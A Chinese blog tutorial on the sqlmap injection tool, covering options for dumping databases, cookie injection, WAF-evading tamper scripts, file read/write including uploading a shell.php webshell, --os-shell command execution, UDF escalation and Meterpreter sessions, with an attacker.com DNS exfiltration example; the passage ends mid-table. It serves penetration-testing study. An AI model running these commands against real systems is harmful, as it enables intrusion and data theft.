<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<title>SQLMAP深入分析-使用篇（基础使用、进阶命令、tamper脚本） - 编程小白</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程小白" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程小白</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">SQLMAP深入分析-使用篇（基础使用、进阶命令、tamper脚本）</h1>
			
		</header>
		<div class="content post__content clearfix">
			


                <div id="content_views" class="markdown_views prism-tomorrow-night">
                    
                        
                    
                    <img src="https://images2.imgbox.com/13/cf/NSdORMmn_o.png"> 
<p></p>
<div class="toc">
 <h3>文章目录</h3>
 <ul>
<li><a href="#_22">使用篇</a></li>
<li>
<ul>
<li><a href="#_24">基础命令</a></li>
<li><a href="#_66">进阶命令</a></li>
<li>
<ul>
<li><a href="#_70">输出信息的详细程度</a></li>
<li><a href="#_85">目标</a></li>
<li><a href="#_102">指定连接时信息</a></li>
<li><a href="#_130">指定注入参数</a></li>
<li><a href="#_147">指定检测级别</a></li>
<li><a href="#_189">指定注入类型</a></li>
<li><a href="#_209">枚举信息</a></li>
</ul>
   </li>
<li><a href="#_244">用例</a></li>
<li>
<ul>
<li><a href="#_246">指定数据包注入</a></li>
<li><a href="#_269">伪静态注入</a></li>
<li><a href="#_275">暴力破解</a></li>
<li><a href="#_295">文件操作</a></li>
<li><a href="#_315">执行命令</a></li>
<li><a href="#UDF_344">UDF提权</a></li>
<li><a href="#Meterpreter__friends_352">有状态带外连接：Meterpreter &amp; friends</a></li>
<li><a href="#_Windows__365">访问 Windows 注册表</a></li>
<li><a href="#_380">常规选项</a></li>
</ul>
   </li>
<li><a href="#Tamper_399">Tamper脚本</a></li>
<li>
<ul>
<li><a href="#tamper____409">tamper 适用的数据库类型 &amp; 版本</a></li>
<li><a href="#tamper_457">自带tamper介绍</a></li>
<li><a href="#tamper_689">编写tamper</a></li>
<li>
<ul>
<li><a href="#import_721">import部分</a></li>
<li><a href="#priority_725">priority</a></li>
<li><a href="#dependencies_740">dependencies</a></li>
<li><a href="#tamper_772">tamper函数</a></li>
</ul>
   </li>
</ul>
  </li>
</ul>
  </li>
<li><a href="#_797">代码分析</a></li>
<li><a href="#_799">攻防</a></li>
</ul>
</div>
<br> 学安全的都知道这个注入神器 Sqlmap，也正是这些神器的出现，我们逐渐变成了“脚本小子”，要想变成大佬，就要求不仅会用还会写，在面试中也是经常会问 Sqlmap 原理，或者自动化注入这样的问题，所以就深入来学一学 Sqlmap
<p></p> 
<p>Sqlmap 使用 Python 语言开发，原来用的 Python2 新版本 1.5 使用 Python3，分析使用的也是 1.5 版本</p> 
<ul>
<li>项目地址：<a href="https://github.com/sqlmapproject/sqlmap">https://github.com/sqlmapproject/sqlmap</a>
</li>
<li>中文文档：<a href="https://sqlmap.campfire.ga">https://sqlmap.campfire.ga</a>
</li>
<li>阅读文档是发现的一个有趣的项目：中文文档编写指北，<a href="https://github.com/mzlogin/chinese-copywriting-guidelines">https://github.com/mzlogin/chinese-copywriting-guidelines</a>
</li>
</ul> 
<p>Sqlmap 具有以下功能</p> 
<ul>
<li>识别有漏洞的参数</li>
<li>针对有漏洞的参数，自动选取对应类型的 SQL 注入技术</li>
<li>识别后端 DBMS 的相关指纹信息</li>
<li>根据用户使用的选项，它还能采集尽可能多的指纹信息，拉取数据或是掌管整个数据库服务器</li>
</ul> 
<p>之后会对这些功能原理进行分析</p> 
<p><img src="https://images2.imgbox.com/ee/dc/2sWkfVH0_o.png" alt="image-20211229131143044"></p> 
<h1>
<a id="_22"></a>使用篇</h1> 
<h2>
<a id="_24"></a>基础命令</h2> 
<ol>
<li> <p>判断网址有无SQL注入漏洞</p> <pre><code class="prism language-bash">sqlmap -u <span class="token string">"⽹址"</span>
</code></pre> <p>结束以后会得到该⽹站的数据库、操作系统、服务器等版本信息</p> </li>
<li> <p>如果存在漏洞可以使用以下命令注出当前网站下所有数据库名</p> <pre><code class="prism language-bash">sqlmap -u <span class="token string">"⽹址"</span> --dbs
</code></pre> </li>
<li> <p>注出指定数据库下的所有表名</p> <pre><code class="prism language-bash">sqlmap -u <span class="token string">"⽹址"</span> -D 数据库名 --tables
</code></pre> </li>
<li> <p>注出指定数据库指定表下所有列信息</p> <pre><code class="prism language-bash">sqlmap -u <span class="token string">"⽹址"</span> -D 数据库名 -T 表名 --columns
</code></pre> </li>
<li> <p>注出所有指定列数据</p> <pre><code class="prism language-bash">sqlmap -u <span class="token string">"⽹址"</span> -D 数据库名 -T 表名 -C 列名 --dump
</code></pre> <p>在任意环节使用<code>--dumps</code>，可以将所有数据注出，如指定数据库使用，注出所有数据库下的所有表的所有字段信息</p> <pre><code class="prism language-bash">python3 .<span class="token punctuation"></span>sqlmap.py -u <span class="token string">"http://127.0.0.1:8888/Less-2/?id=1"</span> -D <span class="token builtin class-name">test</span> --dump
</code></pre> <p><code>--batch</code>命令可以自动跳过选择项，按默认选项注入</p> </li>
</ol> 
<h2>
<a id="_66"></a>进阶命令</h2> 
<p>此部分参考 sqlmap 手册，在手册基础上进行了精炼</p> 
<h3>
<a id="_70"></a>输出信息的详细程度</h3> 
<pre><code class="prism language-bash">-v	<span class="token comment">#共7个级别(0~6)，默认为1</span>
<span class="token comment">#可以用 -vv 代替 -v 2，推荐使用这种方法</span>
</code></pre> 
<ul>
<li>
<strong>0</strong>：只输出 Python 出错回溯信息，错误和关键信息</li>
<li>
<strong>1</strong>：增加输出普通信息和警告信息</li>
<li>
<strong>2</strong>：增加输出调试信息</li>
<li>
<strong>3</strong>：增加输出已注入的 payloads</li>
<li>
<strong>4</strong>：增加输出 HTTP 请求</li>
<li>
<strong>5</strong>：增加输出 HTTP 响应头</li>
<li>
<strong>6</strong>：增加输出 HTTP 响应内容</li>
</ul> 
<h3>
<a id="_85"></a>目标</h3> 
<pre><code class="prism language-bash">-d	<span class="token comment">#直连数据库，"mysql://root:root@192.168.0.8:3306/testdb"</span>
-u URL
-l	<span class="token comment">#从Burp代理日志文件中解析目标地址</span>
-m	<span class="token comment">#从文本文件中批量获取目标</span>
-r	<span class="token comment">#从文件中读取 HTTP 请求</span>
-g	<span class="token comment">#使用 Google dork 结果作为目标地址 python sqlmap.py -g "inurl:".php?id=1""</span>
-c	<span class="token comment">#从 INI 配置文件中读取选项</span>

--purge			<span class="token comment">#清除历史缓存</span>
--flush-session	<span class="token comment">#清除上次扫描的缓存</span>
</code></pre> 
<p>注：<code>-d</code>是一个一个新的开关选项，它允许你通过 DBMS 守护进程监听的 TCP 端口直接连接目标数据库服务器，便于使用 SQL 注入技术对目标数据库进行攻击</p> 
<h3>
<a id="_102"></a>指定连接时信息</h3> 
<p>指定连接目标地址的方式</p> 
<pre><code class="prism language-bash">--method<span class="token operator">=</span>METHOD		<span class="token comment">#强制使用提供的 HTTP 方法（例如：PUT）</span>
--data<span class="token operator">=</span>DATA			<span class="token comment">#使用 POST 发送数据串；--data="id=1&amp;user=admin"</span>
--param-del<span class="token operator">=</span><span class="token string">";"</span>		<span class="token comment">#使用参数分隔符，--data="id=1;user=admin"</span>
--cookie<span class="token operator">=</span>COOKIE		<span class="token comment">#指定 HTTP Cookie ，--cookie "id=11" --level 2</span>
--drop-set-cookie	<span class="token comment">#忽略 HTTP 响应中的 Set-Cookie 参数</span>
--user-agent<span class="token operator">=</span>AGENT	<span class="token comment">#指定 HTTP User-Agent</span>
--random-agent		<span class="token comment">#使用随机的 HTTP User-Agent，随机从 ./txt/user-agents.txt 选一个，不是每次请求换一个</span>
--host				<span class="token comment">#手动设置 HTTP Host 请求头值，默认情况下，HTTP Host 请求头从提供的目标 URL 中解析</span>
--referer<span class="token operator">=</span>REFERER	<span class="token comment">#指定 HTTP Referer，默认情况下不会在 HTTP 请求中发送 HTTP Referer 请求头</span>
-H HEADER			<span class="token comment">#设置额外的 HTTP 头参数（例如："X-Forwarded-For: 127.0.0.1"）</span>
--headers<span class="token operator">=</span>HEADERS	<span class="token comment">#设置额外的 HTTP 头参数,必须以换行符分隔（例如："Accept-Language: frnETag: 123"）</span>
--auth-type，--auth-cred <span class="token comment">#选项用于指定后端 Web 服务器实现的 HTTP 协议认证和所有向目标程序发起 HTTP 请求的有效凭据，支持的三种 HTTP 协议认证机制是：Basic、Digest、NTLM，认证凭据的语法是 username:password。一个符合语法的例子：$ python sqlmap.py -u "http://192.168.136.131/sqlmap/mysql/basic/get_int.php?id=1" --auth-type Basic --auth-cred "testuser:testpass"</span>
--auth-file			<span class="token comment">#HTTP 协议私钥认证</span>
--ignore-code		<span class="token comment">#忽略（有问题的）HTTP 错误码</span>
--proxy，--proxy-cred，--proxy-file 和 --ignore-proxy	<span class="token comment">#HTTP(S) 代理，--proxy 并提供 HTTP(S) 代理地址使 HTTP(S) 请求经过该代理到达目标 URL。设置 HTTP(S) 代理的语法是 http://url:port。如果 HTTP(S) 代理需要身份验证，则可以对选项 --proxy-cred 使用 username:password 格式添加对应的凭证可以使用选项 --proxy-file 并指定包含批量代理的文件，想要使用 sqlmap 对本地局域网目标进行测试时应该使用开关 --ignore-proxy 来绕过系统级的 HTTP(S) 代理服务</span>
--delay<span class="token operator">=</span><span class="token number">10</span>			<span class="token comment">#设置每个 HTTP 请求的延迟秒数</span>
--safe-freq<span class="token operator">=</span>SAFE	 <span class="token comment">#每访问两次给定的合法 URL 才发送一次测试请求</span>
--csrf-token 和 --csrf-url	<span class="token comment">#绕过反 CSRF 防护</span>
-force-ssl			<span class="token comment">#支持https的SQL注入只需加入参数-force-ssl告诉sqlmap这是http服务即可</span>
--identify-waf		<span class="token comment">#检测是否有WAF/IPS/IDS，这个功能以失效</span>
--eval				<span class="token comment">#在每个请求期间运行自定义的 Python 代码</span>
</code></pre> 
<h3>
<a id="_130"></a>指定注入参数</h3> 
<p>以下选项用于指定要测试的参数</p> 
<p>提供自定义注入 payloads 和篡改参数的脚本</p> 
<pre><code class="prism language-bash">-p TESTPARAMETER	<span class="token comment">#指定需要测试的参数</span>
--skip<span class="token operator">=</span>SKIP			<span class="token comment">#指定要跳过的参数</span>
--dbms<span class="token operator">=</span>DBMS			<span class="token comment">#指定 DBMS 类型（例如：MySQL）</span>
--os<span class="token operator">=</span>OS				<span class="token comment">#指定 DBMS 服务器的操作系统类型</span>
--prefix<span class="token operator">=</span>PREFIX		 <span class="token comment">#注入 payload 的前缀字符串</span>
--suffix<span class="token operator">=</span>SUFFIX		 <span class="token comment">#注入 payload 的后缀字符串</span>
--tamper<span class="token operator">=</span>TAMPER		 <span class="token comment">#用给定脚本修改注入数据</span>
--batch				<span class="token comment"># 自动跳过选择项，按默认选项注入</span>
</code></pre> 
<h3>
<a id="_147"></a>指定检测级别</h3> 
<p>sqlmap 使用的 payloads 直接从文本文件 <code>xml/payloads.xml</code> 中载入。</p> 
<p>根据该文件顶部的相关指导说明进行设置，如果 sqlmap 漏过了特定的注入，</p> 
<p>你可以选择自己修改指定的 payload 用于检测。</p> 
<p><strong>level有5级，越高检测越全，默认为 1</strong></p> 
<blockquote> 
 <p>–level 1 检测Get和Post</p> 
 <p>–level 2 检测HTTP Cookie</p> 
 <p>–level 3 检测User-Agent和Referer</p> 
 <p>–level 4 检测</p> 
 <p>–level 5 检测 HOST 头</p> 
</blockquote> 
<p><strong>risk有3级，级别越高风险越大，默认为1</strong></p> 
<blockquote> 
 <p>–risk 2 会在默认的检测上添加大量时间型盲注语句测试</p> 
 <p>–risk 3 会在原基础上添加<code>OR</code> 类型的布尔型盲注 ，可能会update导致修改数据库</p> 
</blockquote> 
<p><strong>页面对比</strong></p> 
<p>选项：<code>--string</code>，<code>--not-string</code>，<code>--regexp</code> 和 <code>--code</code></p> 
<p>默认区分一个 <code>True</code> 查询和 <code>False</code> 查询（布尔型盲注背后的相关理念概念）是通过对比注入前后返回的结果页面是否一致进行判断的</p> 
<p>不过这个参照方法并不一定有效，因为可能就算没有进行注入，页面内容也会进行相应更新。例如：页面上有计数器、动态的广告横幅、或者任何基于时间而非用户输入内容进行动态渲染的内容。为了避免类似的情况，sqlmap 会尽可能尝试识别出对应的代码段所返回的请求内容并做好相关的处理</p> 
<p>如果用户知道可以通过 HTTP 状态码区分 <code>True</code> 查询和 <code>False</code> 查询（例如：<code>200</code> 对应 <code>True</code>，<code>401</code> 对应 <code>False</code>），那么可以向 sqlmap 提供对应的信息。（例如：<code>--code=200</code>）</p> 
<p>开关：<code>--text-only</code> 和 <code>--titles</code></p> 
<p>如果用户知道可以通过 HTML 标题区分 <code>True</code> 查询和 <code>False</code> 查询（例如：<code>Welcome</code> 对应 <code>True</code>，<code>Forbidden</code> 对应 <code>False</code>），那么可以使用 <code>--titles</code> 开启基于标题对比的开关</p> 
<p>如果 HTTP 响应报文中存在无效信息（例如：脚本、嵌套元素等），可以通过过滤页面的内容（开关 <code>--text-only</code>）而只获取文本内容。通过这种方式，大多数情况下，这样会自动调优检测引擎</p> 
<h3>
<a id="_189"></a>指定注入类型</h3> 
<p>以下选项用于调整特定 SQL 注入技术的测试方法</p> 
<pre><code class="prism language-bash">--technique<span class="token operator">=</span>TECH	<span class="token comment">#使用的 SQL 注入技术（默认为“BEUSTQ”)</span>
B: Boolean-based blind SQL injection（布尔型盲注）
E: Error-based SQL injection（报错型注入）
U: UNION query SQL injection（联合查询注入）
S: Stacked queries SQL injection（堆查询注入）
T: Time-based blind SQL injection（时间型盲注）
Q: inline Query injection（内联查询注入）
<span class="token comment"># 例如，如果仅测试利用报错型注入和堆叠查询注入，你可以提供 ES</span>

--time-sec<span class="token operator">=</span>TIMESEC  <span class="token comment">#设置延时注入的时间（默认为 5）</span>
--second-order<span class="token operator">=</span>S<span class="token punctuation">..</span>  <span class="token comment">#设置二阶响应的结果显示页面的 URL（该选项用于二阶 SQL 注入）</span>
--dns-domain		<span class="token comment">#DNS 渗出攻击</span>
<span class="token comment"># 如果用户正控制着一台注册为 DNS 域名服务器的主机（例如：域名 attacker.com），则可以使用该选项（例如：--dns-domain attacker.com）来启用此攻击。它的前提条件是使用 Administrator（即管理员）权限（因为需要使用特权端口 53）运行 sqlmap，这时可以使用常用的（盲注）技术来进行攻击。如果已经识别出一种有效攻击方式（最好是时间型盲注），则这种攻击能够加速获取数据的过程。如果报错型注入或联合查询注入技术可用，则默认情况下将跳过 DNS 渗出攻击测试</span>
</code></pre> 
<h3>
<a id="_209"></a>枚举信息</h3> 
<p>以下选项用于获取数据库的信息，结构和数据表中的数据。</p> 
<pre><code class="prism language-bash">-a, --all          <span class="token comment">#获取所有信息、数据</span>
-f, --fingerprint	<span class="token comment">#采用特定 SQL 方言或者内带特定错误信息等技术展开详细的 DBMS 指纹识别</span>
-b, --banner        <span class="token comment">#获取 DBMS banner,返回数据库的版本号</span>
--current-user			<span class="token comment">#获取 DBMS 当前用户</span>
--current-db			<span class="token comment">#获取 DBMS 当前数据库</span>
--hostname				<span class="token comment">#获取 DBMS 服务器的主机名</span>
--is-dba				<span class="token comment">#探测 DBMS 当前用户是否为 DBA（数据库管理员）</span>
--users					<span class="token comment">#枚举出 DBMS 所有用户</span>
--passwords				<span class="token comment">#枚举出 DBMS 所有用户的密码哈希</span>
--privileges			<span class="token comment">#枚举出 DBMS 所有用户特权级</span>
--roles					<span class="token comment">#枚举出 DBMS 所有用户角色</span>

--dbs					<span class="token comment">#枚举出 DBMS 所有数据库</span>
--tables				<span class="token comment">#枚举出 DBMS 数据库中的所有表，--exclude-sysdbs 以排除所有的系统数据库，对于 Oracle，你需要提供 TABLESPACE_NAME 而不是数据库名称</span>
--columns				<span class="token comment">#枚举出 DBMS 表中的所有列，对于 PostgreSQL，你需要提供 public 或系统数据库的名称。这是因为不可能枚举其他数据库表，只能枚举出 Web 应用程序用户连接到的数据库模式下的表，它们总是以 public 为别名</span>
--schema				<span class="token comment">#枚举出 DBMS 所有模式</span>
--count					<span class="token comment">#获取数据表数目</span>
--dump-all				<span class="token comment">#如果当前会话用户的读取权限允许，可以一次导出所有数据库表条目</span>
--dump					<span class="token comment">#导出 DBMS 数据库表项</span>
--search，-C，-T，-D		<span class="token comment">#此开关允许你在所有数据库中搜索特定的数据库名和表名，在特定的数据表中搜索特定的列名</span>
--stop <span class="token number">10</span>				<span class="token comment">#只取前10行数据</span>
    
-D DB					<span class="token comment">#指定要枚举的 DBMS 数据库</span>
-T TBL					<span class="token comment">#指定要枚举的 DBMS 数据表</span>
-C COL					<span class="token comment">#指定要枚举的 DBMS 数据列</span>
    
--sql-query<span class="token operator">=</span>QUERY		<span class="token comment">#指定要执行的 SQL 语句</span>
--sql-shell				<span class="token comment">#调出交互式 SQL shell</span>
</code></pre> 
<h2>
<a id="_244"></a>用例</h2> 
<h3>
<a id="_246"></a>指定数据包注入</h3> 
<ul>
<li> <p>从文件读取HTTP请求，GET和POST都可以</p> <pre><code class="prism language-bash">sqlmap -r <span class="token string">"burp.txt"</span> -p <span class="token string">"username"</span>	<span class="token comment">#-p 指定存在注入的参数</span>
</code></pre> <p>这里的 txt 文件就是完整的 http 请求包，可以使用 -p 指定参数，也可以在 txt 文件中使用 *（星号）定位，特别是注入点后需要使用闭合语句的情况下</p> </li>
<li> <p>Cookie注入</p> <pre><code class="prism language-bash">sqlmap -u <span class="token string">"http://www.vuln.com"</span> --cookie <span class="token string">"id=11"</span> --level <span class="token number">2</span>
</code></pre> </li>
<li> <p>当防火墙对请求速度做了限制</p> <pre><code class="prism language-bash">sqlmap -u <span class="token string">"http://www.vuln.com/post.php?id=1"</span> --delay<span class="token operator">=</span><span class="token number">10</span>
<span class="token comment"># 在每个HTTP请求之间的延迟10秒</span>
</code></pre> </li>
</ul> 
<h3>
<a id="_269"></a>伪静态注入</h3> 
<pre><code class="prism language-bash">sqpmap  -u http://victim.com/id/666*.html --dbs  <span class="token comment">#在html扩展名前加个'*'</span>
</code></pre> 
<h3>
<a id="_275"></a>暴力破解</h3> 
<p>当数据库为以下情况时，需要暴力破解表名和列名</p> 
<ul>
<li>DBMS（Database Management System，数据库管理系统）是 <strong>&lt; 5.0</strong> 版本的 MySQL，它们不具备 <code>information_schema</code>
</li>
<li>DBMS 是微软的 Access 数据库，并且其中的系统表 <code>MSysObjects</code> 默认设置不可读</li>
<li>当前会话用户对 DBMS 中存储数据表定义的系统表没有读权限</li>
</ul> 
<p><strong>暴力破解表名</strong></p> 
<p>只要开启了 <code>--common-tables</code>，sqlmap 仍然可以识别出部分系统数据表。sqlmap 会尝试对系统表进行暴力破解，试图找出 DBMS 中存在的常见数据表，常见的数据表名列表存储在 <code>txt/common-tables.txt</code>，支持用户进行任意修改</p> 
<pre><code class="prism language-bash">python sqlmap.py -u <span class="token string">"http://192.168.136.129/mysql/get_int_4.php?id=1"</span> --common-tables -D testdb
</code></pre> 
<p><strong>暴力破解列名</strong></p> 
<p>开启了 <code>--columns</code> 开关，sqlmap 则会提示你是否使用暴力破解技术。因而，就算出现上面两个场景之一，只要你开启了 <code>--common-columns</code>，sqlmap 仍然可以识别出部分系统数据表。sqlmap 会尝试对系统表进行暴力破解，试图找出 DBMS 中存在的常见数据表列名，常见的数据表名列表存储在 <code>txt/common-columns.txt</code>，支持用户进行任意修改</p> 
<h3>
<a id="_295"></a>文件操作</h3> 
<p>仅对MySQL、MSSQL、PostgreSQL有效，可以进行文件操作</p> 
<p>前提：</p> 
<ul>
<li>数据库用户有读写权限</li>
<li>有目录读写文件权限</li>
</ul> 
<pre><code class="prism language-bash">sqlmap -u url --is-dba
<span class="token comment">#查看是否dba权限,必须为root权限</span>

sqlmap -u url --file-read <span class="token string">"C:/Windows/win.ini"</span>		
<span class="token comment">#读取文件</span>

sqlmap -u url --file-write<span class="token operator">=</span>D:/shell.php --file-dest<span class="token operator">=</span>C:/www/shell.php
<span class="token comment">#上传文件 (本地木马路径:目标网站目录)</span>
</code></pre> 
<h3>
<a id="_315"></a>执行命令</h3> 
<p>仅对MySQL、MSSQL、PosgreSQL有效</p> 
<p>前提：</p> 
<ul>
<li>数据库用户有读写权限</li>
<li>有目录读写文件权限</li>
</ul> 
<p>sqlmap 能够在<strong>数据库所在服务器的操作系统上运行任意的命令</strong></p> 
<pre><code class="prism language-bash">sqlmap -u <span class="token string">"URL"</span> --os-shell	<span class="token comment">#获取系统交互shell或--os-cmd=id执行系统命令</span>
</code></pre> 
<p><a href="https://blog.sari3l.com/posts/8dea0d95/">原理</a>就是上传一个 upload 木马后，再上传一个cmd shell</p> 
<p>当 <code>--os-shell</code>退出后， 会调用后门脚本删除上传文件后，进行自删除</p> 
<ul>
<li> <p>在 MySQL 和 PostgreSQL 中，sqlmap 可以上传一个包含两个用户自定义函数</p> <p>分别为 <code>sys_exec()</code> 和 <code>sys_eval()</code> 的共享库（二进制文件），然后在数据库中创建出两个对应函数，并调用对应函数执行特定的命令，并允许用户选择是否打印出相关命令执行的结果。</p> </li>
<li> <p>在 Microsoft SQL Server 中，sqlmap 会利用 <code>xp_cmdshell</code> 存储过程：</p> <p>如果该存储过程被关闭了（Microsoft SQL Server 的 2005 及以上版本默认关闭），sqlmap 则会将其重新打开；如果该存储过程不存在，sqlmap 则会重新创建它，当用户请求标准输出，sqlmap 将使用任何可用的 SQL 注入技术（盲注、带内注入、报错型注入）去获取对应结果。相反，如果无需标准输出对应结果，sqlmap 则会使用堆叠查询注入（Stacked queries）技术执行相关的命令。</p> </li>
<li> <p>如果堆叠查询没有被 Web 应用识别出来，并且 DBMS 为 MySQL，假如后端 DBMS 和 Web 服务器在同一台服务器上，则仍可以通过利用 <code>SELECT</code> 语句中的 <code>INTO OUTFILE</code>，在 根目录可写目录中写shell</p> </li>
</ul> 
<h3>
<a id="UDF_344"></a>UDF提权</h3> 
<p>可以通过编译 MySQL 或 PostgreSQL 共享库（在 Windows 上为 DLL，在 Linux/Unix 上为共享对象（shared object））来注入自己的用户自定义函数（UDFs），然后将本地存储共享库的目录路径提供给 sqlmap。sqlmap 会根据你的选择决定下一步是向数据库服务器文件系统上传共享库到还是创建用户自定义函数。当你完成注入 UDFs 的使用后，sqlmap 还可以将它们从数据库中删除</p> 
<p>使用选项 <code>--udf-inject</code> 并按照说明进行操作即可；如果需要，也可以使用 <code>--shared-lib</code> 选项通过命令行指定共享库的本地文件系统路径，否则 sqlmap 会在运行时向你询问路径</p> 
<p>此功能仅对 MySQL 或 PostgreSQL 有用</p> 
<h3>
<a id="Meterpreter__friends_352"></a>有状态带外连接：Meterpreter &amp; friends</h3> 
<p>开关和选项：<code>--os-pwn</code>，<code>--os-smbrelay</code>，<code>--os-bof</code>，<code>--priv-esc</code>，<code>--msf-path</code> 和 <code>--tmp-path</code></p> 
<p>当后端 DBMS 为 MySQL，PostgreSQL 或 Microsoft SQL Server 时，并且当前会话用户拥有对数据库特定功能和架构缺陷的利用权限时，sqlmap 能够在<strong>攻击者机器与数据库服务器之间建立起有状态带外 TCP 连接</strong>。根据用户的选择，该连接可以是交互式命令行、Meterpreter 会话、或者图形用户界面（VNC）会话</p> 
<p>sqlmap 依赖 Metasploit 创建 shellcode，并实现了四种不同的技术在数据库服务器上执行它。这些技术分别是：</p> 
<ul>
<li>通过 sqlmap 的用户自定义函数 <code>sys_bineval()</code> 在数据库<strong>内存中执行 Metasploit shellcode</strong>。MySQL 和 PostgreSQL 支持该技术，通过开关 <code>--os-pwn</code> 启用</li>
<li>通过 sqlmap 的用户自定义函数 <code>sys_exec()</code> 向 MySQL 和 PostgreSQL 上传一个 Metasploit <strong>独立 payload 传输器</strong>并执行，对于 Microsoft SQL Server 则是使用 <code>xp_cmdshell()</code> 函数，通过开关 <code>--os-pwn</code> 启用</li>
<li>通过进行从数据库服务器到攻击者机器（由 Metasploit <code>smb_relay</code> 服务监听）之间的 UNC 路径请求的 <strong>SMB 反射攻击</strong>（<a href="http://www.microsoft.com/technet/security/Bulletin/MS08-068.mspx">MS08-068</a>）来执行 Metasploit shellcode。当 sqlmap 运行于具有高权限（<code>uid=0</code>）的 Linux/Unix 上，且目标 DBMS 以 Windows 管理员身份运行时支持该技术，通过开关 <code>--os-smbrelay</code> 启用</li>
<li>通过利用 <strong>Microsoft SQL Server 2000 和 2005 的</strong> <strong><code>sp_replwritetovarbin</code></strong> <strong>存储过程堆缓冲区溢出</strong>（<a href="http://www.microsoft.com/technet/security/bulletin/ms09-004.mspx">MS09-004</a>）在数据库内存中执行 Metasploit shellcode。sqlmap 使用自己的 exploit，自动绕过 DEP 内存保护来触发漏洞，但它依赖 Metasploit 生成 shellcode，以便在成功利用时执行，通过开关 <code>--os-bof</code> 启用</li>
</ul> 
<h3>
<a id="_Windows__365"></a>访问 Windows 注册表</h3> 
<p>条件：</p> 
<ul>
<li>DBMS（Database Management System，数据库管理系统）是 MySQL，PostgreSQL 或 Microsoft SQL Server</li>
<li>Web 应用程序支持堆叠查询</li>
<li>会话用户必须具备相应的访问权限</li>
</ul> 
<pre><code class="prism language-bash">--reg-read		<span class="token comment">#读取 Windows 注册表键值</span>
--reg-add		<span class="token comment">#写入 Windows 注册表键值</span>
--reg-del		<span class="token comment">#删除 Windows 注册表项</span>
--reg-key，--reg-value，--reg-data 和 --reg-type <span class="token comment">#注册表辅助选项</span>
</code></pre> 
<h3>
<a id="_380"></a>常规选项</h3> 
<pre><code class="prism language-bash">-s			<span class="token comment">#从已存储（.sqlite）文件读取会话</span>
<span class="token comment">#qlmap 会在专用的输出目录中自动为每一个目标分别建立持久会话 SQLite 文件，该文件会存储用于恢复会话的所有数据。如果用户需要指定会话文件的具体存储位置（例如：将所有目标的会话数据存储在同一个位置），则可以使用这个选项</span>
-t			<span class="token comment">#记录 HTTP(s) 访问信息到文本文件,这个选项需要一个指定文本文件地址的参数，用于写入 sqlmap 产生的所有 HTTP(s) 流量信息——包括 HTTP(S) 请求 和 HTTP(S) 响应</span>
--batch		<span class="token comment">#以非交互式模式运行,当 sqlmap 需要用户输入信息时，都将会以默认参数运行</span>
--update	<span class="token comment">#更新 sqlmap</span>
--flush-session <span class="token comment">#清空会话文件</span>
更多选项：
https://sqlmap.campfire.ga/usage/general
</code></pre> 
<p>杂项：https://sqlmap.campfire.ga/usage/miscellaneous</p> 
<p>api：https://sqlmap.campfire.ga/usage/api</p> 
<p><img src="https://images2.imgbox.com/ff/27/vhmvYA2V_o.png" alt="image-20211229191645533"></p> 
<h2>
<a id="Tamper_399"></a>Tamper脚本</h2> 
<p>此部分转载自li qun师傅博客：<a href="https://ailiqun.xyz/2020/06/15/tamper">https://ailiqun.xyz/2020/06/15/tamper</a></p> 
<p>tamper 脚本可以用来对 sqlmap 的 sql 查询语句进行一次处理，让其绕过过滤，tamper 脚本在 sqlmap 安装目录的 tamper 目录下</p> 
<pre><code class="prism language-bash">use age：sqlmap.py --tamper<span class="token operator">=</span><span class="token string">"模块名.py"</span>
</code></pre> 
<h3>
<a id="tamper____409"></a>tamper 适用的数据库类型 &amp; 版本</h3> 
<table>
<thead><tr>
<th>TAMPER</th>
<th>MySQL</th>
<th>MSSQL</th>
<th>Oracle</th>
<th>PostgreSQL</th>
</tr></thead>
<tbody>
<tr>
<td>apostrophemask</td>
<td>*</td>
<td>*</td>
<td>*</td>
<td>*</td>
</tr>
<tr>
<td>apostrophenullencode</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td>appendnullbyte</td>
<td>*</td>
<td>*</td>
<td>*</td>
<td>*</td>
</tr>
<tr>
<td>base64encode</td>
<td>4,5,5.5</td>
<td>2005</td>
<td>10g</td>
<td>-</td>
</tr>
<tr>
<td>between</td>
<td>5.1</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td>bluecoat</td>
<td>*</td>
<td>*</td>
<td>*</td>
<td>*</td>
</tr>
<tr>
<td>apostrophemask</td>
<td>9.0.3</td>
<td>20002005</td>
<td>-</td>
<td>9.3</td>
</tr>
<tr>
<td>charunicodeencode</td>
<td>4,5.0 and 5.5</td>
<td>2005</td>
<td>10g</td>
<td>8.3,8.4,9.0</td>
</tr>
<tr>
<td>charencode</td>
<td>*</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td>commalessmid</td>
<td>*</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td>concat2concatws</td>
<td>*</td>
<td>*</td>
<td>*</td>
<td>*</td>
</tr>
<tr>
<td>equaltolike</td>
<td>*</td>
<td>*</td>
<td>*</td>
<td>*</td>
</tr>
<tr>
<td>greatest</td>
<td>&lt; 5.1</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td>halfversionedmorekeywords</td>
<td>5.0 and 5.5</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td>ifnull2ifisnull</td>
<td>*</td>
<td>*</td>
<td>*</td>
<td>*</td>
</tr>
<tr>
<td>informationschemacomment</td>
<td>4,5.0,5.5</td>
<td>2005</td>
<td>10g</td>
<td>8.3,8.4,9.0</td>
